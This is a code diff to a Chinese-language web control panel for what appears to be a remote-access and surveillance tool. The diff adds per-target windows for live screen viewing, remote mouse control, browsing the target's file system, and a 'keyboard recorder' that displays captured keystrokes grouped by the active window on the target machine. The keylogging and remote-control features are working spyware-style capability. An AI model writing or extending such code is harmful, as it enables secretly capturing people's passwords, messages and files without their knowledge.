@@ -6,10 +6,18 @@
     <meta HTTP-EQUIV="EXPIRES" CONTENT="Mon, 22 Jul 2002 11:12:01 GMT">
     <script type="text/javascript" src="js/jquery-3.6.1.min.js"></script>
     <style>
-        #treeView  {
+        .tree {
+            width: 400px;
+            height: 400px;
+            overflow: auto;
+            border: 1px solid #ccc;
+            background-color: #fff;
+            overflow: scroll
+        }
+        .treeView  {
             float: left
         }
-        #screenView  {
+        .screenView  {
             float: right
         }
         .xicon {
@@ -18,6 +26,7 @@
         .xname {
             float: right
         }
+
     </style>
     <link href="css/navbar.css" rel="stylesheet">
     <link href="css/slider.css" rel="stylesheet">
@@ -31,6 +40,7 @@
   <body>
     <nav role="navigation" class="primary-navigation">
         <ul>
+            <li id="mouse_button" class="button"><a id="mouseToggle" href="javascript:mouseToggle()">開啟滑鼠功能</a></li>
             <li id="setting_button" class="button"><a href="#demo-modal">設定</a></li>
             <li id="select_button"><a href="#">選擇使用者</a>
             <ul class="dropdown">
@@ -77,19 +87,9 @@
             <a href="#" class="modal__close">&times;</a>
         </div>
     </div>
-
-    <div id="wrap">
-        <div id="treeView">
-            <div id="tree"></div>
-        </div>
-        <div id="screenView">
-            
-        </div>
-    </div>
-    
-    <div id="keyRecord">
-
-    </div>
+    <script src="js/jquery.collapse.js"></script>
+    <script src="js/jquery.collapse_storage.js"></script>
+    <script src="js/jquery.collapse_cookie_storage.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/js-base64@3.7.2/base64.min.js"></script>
     <script type="text/javascript">
         const CLIENT_ID = '366215724019-qqo1q5nlos02ac5ii4a55sfqqrs04tsl.apps.googleusercontent.com';
@@ -106,10 +106,14 @@
         let uidScreenMap = [];
         let uidTimer = {};
         let userList = [];
+        let mouseEnabled = false;
+        let keyRecoder = [];
+
         document.getElementById('authorize_button').style.visibility = 'hidden';
         document.getElementById('signout_button').style.visibility = 'hidden';
         document.getElementById('setting_button').style.visibility = 'hidden';
         document.getElementById('select_button').style.visibility = 'hidden';
+        document.getElementById('mouse_button').style.visibility = 'hidden';
 
         let rnd_id = uuidv4();
         
@@ -152,11 +156,78 @@
         let lShift = 10;
         let tShift = 10;
 
-        function openNewWindow(uid) {
-            let winUUID = uuidv4();
-            uidScreenMap[uid] = winUUID;
+        function openNewFileBrowser(uid) {
+            let winUUID = uidScreenMap[uid];
             var w1 = new VtWindow(null, { template: osx.innerHTML, resizable: true, maximizable: true });
-            w1.setTitle(uid);
+            w1.setTitle("檔案瀏覽器：" + uid);
+            w1.setBody(`<div style="padding: 10px; text-align: center; width: 100%;"><div id="wrap"><div class="treeView" id="treeView` + winUUID + `"><div class="tree" id="tree` + winUUID + `"></div></div> <div class="screenView" id="screenView` + winUUID + `"></div></div></div>`);
+            w1.top = 20 + tShift;
+            w1.left = 20 + lShift;
+            w1.width = 400;
+            w1.height = 400;
+            lShift += 10;
+            tShift += 10;
+            w1.mount();
+            w1.focus();
+        }
+
+        function renderRecords(uuid) {
+            let records = keyRecoder[uuid].records;
+            let keys = Object.keys(records);
+
+            let html = "<div class=\"collapse\" data-collapse>";
+            html +="<h3>" + keyRecoder[uuid].currentWindow + "</h3>";
+            html += "<div>";
+            let currentKey = keyRecoder[uuid].currentWindow;
+            let record = records[currentKey];
+            for(let j=0;j<record.length;j++) {
+                html += record[j];
+            }
+            html += "</div>";
+
+            for(let i=0;i<keys.length;i++) {
+                let key = keys[i];
+                if(key == keyRecoder[uuid].currentWindow) continue;
+                let record = records[key];
+                html += "<h3>" + key + "</h3>";
+                html += "<div>";
+                for(let j=0;j<record.length;j++) {
+                    html += record[j];
+                }
+                html += "</div>";
+            }
+            html +="</div>";
+            $("#keyRecord"+uuid).html(html);
+            $('.collapse').collapse({
+                accordion: true,
+                open: function() {
+                    this.slideDown(150);
+                },
+                close: function() {
+                    this.slideUp(150);
+                }
+            });
+        }
+
+        function openNewKeyRecorder(uid) {
+            let winUUID = uidScreenMap[uid];
+            var w1 = new VtWindow(null, { template: osx.innerHTML, resizable: true, maximizable: true });
+            w1.setTitle("鍵盤記錄器：" + uid);
+            w1.setBody(`<div style="padding: 10px; text-align: center; width: 100%;"><div id="keyRecord` + winUUID + `"></div></div>`);
+            w1.top = 20 + tShift;
+            w1.left = 20 + lShift;
+            w1.width = 300;
+            w1.height = 300;
+            lShift += 10;
+            tShift += 10;
+            w1.mount();
+            w1.focus();
+        }
+
+        function openNewWindow(uid) {
+            let winUUID = uidScreenMap[uid];
+            var w1 = new VtWindow(null, { template: osx.innerHTML, resizable: true, maximizable: true });
+            w1.setTitle("遠端控制器：" + uid);
             w1.setBody(`<div style="padding: 10px; text-align: center; width: 100%;"><img ondragstart="return false;" ondrop="return false;" id="` + winUUID + `" style="width:1080px;text-align:left" src="images/wanclogo2.png" ></div>`);
             w1.top = 20 + tShift;
             w1.left = 20 + lShift;
@@ -169,22 +240,28 @@
             var screenImg = document.getElementById(winUUID);
             screenImg.onmousemove = function(e) {
                 let pos = getCoordinates(e,screenImg);
-                send(uid + "," + pos.x + "," + pos.y, "SET_CURSOR");
+                if(mouseEnabled) {
+                    send(uid + "," + pos.x + "," + pos.y, "SET_CURSOR");
+                }
             };
             screenImg.onmousedown = function(e) {
                 let pos = getCoordinates(e,screenImg);
-                if(e.button == 2) {
-                    send(uid + "," + pos.x + "," + pos.y, "RIGHT_DOWN");
-                } else {
-                    send(uid + "," + pos.x + "," + pos.y, "LEFT_DOWN");
+                if(mouseEnabled) {
+                    if(e.button == 2) {
+                        send(uid + "," + pos.x + "," + pos.y, "RIGHT_DOWN");
+                    } else {
+                        send(uid + "," + pos.x + "," + pos.y, "LEFT_DOWN");
+                    }
                 }
             };
             screenImg.onmouseup = function(e) {
                 let pos = getCoordinates(e,screenImg);
-                if(e.button == 2) {
-                    send(uid + "," + pos.x + "," + pos.y, "RIGHT_UP");
-                } else {
-                    send(uid + "," + pos.x + "," + pos.y, "LEFT_UP");
+                if(mouseEnabled) {
+                    if(e.button == 2) {
+                        send(uid + "," + pos.x + "," + pos.y, "RIGHT_UP");
+                    } else {
+                        send(uid + "," + pos.x + "," + pos.y, "LEFT_UP");
+                    }
                 }
             };
             screenImg.onkeydown = function(e) {
@@ -320,6 +397,15 @@
             }
         }
 
+        function mouseToggle() {
+            mouseEnabled = !mouseEnabled;
+            if(mouseEnabled) {
+                document.getElementById("mouseToggle").innerHTML = "關閉滑鼠功能";
+            } else {
+                document.getElementById("mouseToggle").innerHTML = "開啟滑鼠功能";
+            }
+        }
+
         function handleAuthClick() {
             
             tokenClient.callback = async (resp) => {
@@ -329,6 +415,7 @@
                 document.getElementById('signout_button').style.visibility = 'visible';
                 document.getElementById('setting_button').style.visibility = 'visible';
                 document.getElementById('select_button').style.visibility = 'visible';
+                document.getElementById('mouse_button').style.visibility = 'visible';
                 document.getElementById('authorize_button').innerText = '更新';
                 await listUsers('1DyegqnCILVvZVylrLXZxaVOO9wuQKkJw');
             };
@@ -366,7 +453,7 @@
             }
         }
 
-        function addFolder(folderName, path) {
+        function addFolder(uuid,folderName, path) {
             let folder = document.createElement("div");
             folder.className = "folder";
             let icon = document.createElement("img");
@@ -379,7 +466,7 @@
             folder.appendChild(name);
             let br = document.createElement("br");
             folder.appendChild(br);
-            document.getElementById("tree").appendChild(folder);
+            document.getElementById("tree"+uuid).appendChild(folder);
         }
 
         function showDriver() {
@@ -395,7 +482,7 @@
             send(userId + "," + path, "GET_FILE");
         }
 
-        function addFile(fileName, path) {
+        function addFile(uuid, fileName, path) {
             let file = document.createElement("div");
             file.className = "folder";
             let icon = document.createElement("img");
@@ -408,7 +495,7 @@
             file.appendChild(name);
             let br = document.createElement("br");
             file.appendChild(br);
-            document.getElementById("tree").appendChild(file);
+            document.getElementById("tree"+uuid).appendChild(file);
         }
 
         function connect() {
@@ -429,18 +516,40 @@
                 }
                 if(uuid) {
                     if(cmd == "key") {
-                        $("#keyRecord").append(val);
+                        val = e.data.split(":key:")[1];
+                        val = val.replaceAll("\r\n","");
+                        if(!keyRecoder[uuid]) {
+                            keyRecoder[uuid] = {
+                                currentWindow: "Unknown",
+                                records: {}
+                            }
+                        }
+                        if(val.startsWith("執行視窗")) {
+                            val = val.replace("執行視窗","");
+                            keyRecoder[uuid].currentWindow = val;
+                            renderRecords(uuid);
+                            //$("#keyRecord" + uuid).append("<p><b>" + val + "</b></p>");
+                        } else {
+                            let win = keyRecoder[uuid].currentWindow;
+                            if(keyRecoder[uuid].records[win]) {
+                                keyRecoder[uuid].records[win].push(val);
+                            } else {
+                                keyRecoder[uuid].records[win] = [val];
+                            }
+                            renderRecords(uuid);
+                            //$("#keyRecord" + uuid).append("<p>" + val + "</p>");
+                        }
                     } else if(cmd == "screen") {
                         $("#" + uuid).attr("src", "data:image/png;base64, " + val);
                     } else if(cmd == "file_system") {
                         let allFiles = val.split(",");
-                        $("#tree").html("");
+                        $("#tree"+uuid).html("");
                         for(let i=0;i<allFiles.length;i++){
                             let file = allFiles[i].split("|");
                             if(file[2] == "FOLDER") {
-                                addFolder(file[0],file[1]);
+                                addFolder(uuid, file[0],file[1]);
                             } else {
-                                addFile(file[0],file[1]);
+                                addFile(uuid, file[0],file[1]);
                             }
                         }
                     } else if(cmd == "driver_list") {
@@ -448,7 +557,7 @@
                         $("#tree").html("");
                         for(let i=0;i<allDrivers.length;i++){
                             let driverEncoded = Base64.encode(allDrivers[i]);
-                            addFolder(driverEncoded,driverEncoded);
+                            addFolder(uuid,driverEncoded,driverEncoded);
                         }
                     }
                 }
@@ -499,10 +608,13 @@
         }
 
         function showUser(uid) {
-            $("#keyRecord").html("");
             userId = uid;
-            $("#tree").html("");
+            uidScreenMap[uid] = uuidv4();
+            let uuid = uidScreenMap[uid];
             openNewWindow(uid);
+            openNewFileBrowser(uid);
+            openNewKeyRecorder(uid);
+            $("#tree"+uuid).html("");
             send(userId, "SCREEN_START");
             showDriver();
         }
